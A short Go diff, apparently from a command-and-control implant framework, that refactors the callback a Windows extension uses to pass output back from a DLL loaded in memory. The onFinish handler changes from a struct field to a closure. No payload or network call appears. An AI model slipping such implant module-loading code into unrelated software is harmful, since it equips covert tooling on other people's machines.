@@ -37,12 +37,11 @@ const (
 )
 
 type WindowsExtension struct {
-	id       string
-	data     []byte
-	module   *memmod.Module
-	arch     string
-	init     string
-	onFinish func([]byte)
+	id     string
+	data   []byte
+	module *memmod.Module
+	arch   string
+	init   string
 	sync.Mutex
 }
 
@@ -101,8 +100,7 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 	if w.module == nil {
 		return errors.New("{{if .Config.Debug}} module not loaded {{end}}")
 	}
-	w.onFinish = onFinish
-	callback := syscall.NewCallback(w.extensionCallback)
+	callback := syscall.NewCallback(newWindowsExtensionCallback(onFinish))
 	exportPtr, err := w.module.ProcAddressByName(export)
 	if err != nil {
 		return err
@@ -127,13 +125,15 @@ func (w *WindowsExtension) Call(export string, arguments []byte, onFinish func([
 	return nil
 }
 
-// extensionCallback takes a buffer (char *) and its size (int) as parameters
-// so we can pass data back to the Go process from the loaded DLL
-func (w *WindowsExtension) extensionCallback(data uintptr, dataLen uintptr) uintptr {
-	outDataSize := int(dataLen)
-	outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
-	if dataLen > 0 {
-		w.onFinish(outBytes)
+func newWindowsExtensionCallback(onFinish func([]byte)) func(data uintptr, dataLen uintptr) uintptr {
+	// extensionCallback takes a buffer (char *) and its size (int) as parameters
+	// so we can pass data back to the Go process from the loaded DLL
+	return func(data uintptr, dataLen uintptr) uintptr {
+		outDataSize := int(dataLen)
+		outBytes := unsafe.Slice((*byte)(unsafe.Pointer(data)), outDataSize)
+		if dataLen > 0 {
+			onFinish(outBytes)
+		}
+		return Success
 	}
-	return Success
 }
